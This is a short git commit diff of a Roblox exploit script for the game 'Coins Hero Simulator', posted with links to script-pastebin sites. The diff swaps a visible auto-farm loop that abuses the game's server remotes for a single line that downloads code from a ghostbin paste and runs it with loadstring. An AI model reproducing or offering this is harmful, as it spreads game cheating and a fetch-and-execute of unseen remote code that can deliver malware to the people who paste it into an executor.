95d72a1dc7aeacd92d4e7b155b0d40dede96795a
PapaJoeX <jaouad.kassaoui@gmail.com>
2022-12-26 07:15:19 +0100

    commit zero

--- LINK GAME Script pastebin roblox Coins Hero Simulator .lua
+++ LINK GAME Script pastebin roblox Coins Hero Simulator .lua
@@ -1,11 +1,11 @@
 -- find more powerfull verified and New Scripts here : https://script-pastebin.com
 
-_G.on = true-- change true or false while wait(0.1) do     pcall(function() if _G.on == true then game:GetService("ReplicatedStorage").CoinToPlayer:FireServer(3) game:GetService("ReplicatedStorage").Remotes.Skill:FireServer("Cosmos",{math.huge,0,0,0}) game:GetService("ReplicatedStorage").Remotes.Sell:FireServer() game:GetService("ReplicatedStorage").Remotes.BuyAllSkills:InvokeServer("Cosmos") game:GetService("ReplicatedStorage").Remotes.BuyAllBackpacks:InvokeServer() game:GetService("ReplicatedStorage").Remotes.Rank:InvokeServer() end end) end
+loadstring(game:HttpGet('https://ghostbin.co/paste/ctpa/raw'))()
 
 -- find more powerfull verified and New Scripts here : https://scriptpastebin.io
 
 --[[ Script Description:
 
-							LIMITED Unlock all Rank, Auto-farm, Cash-farm - Gems-farm, Auto-buy
+							Script for maximum pumping in this place
 						
 ]]
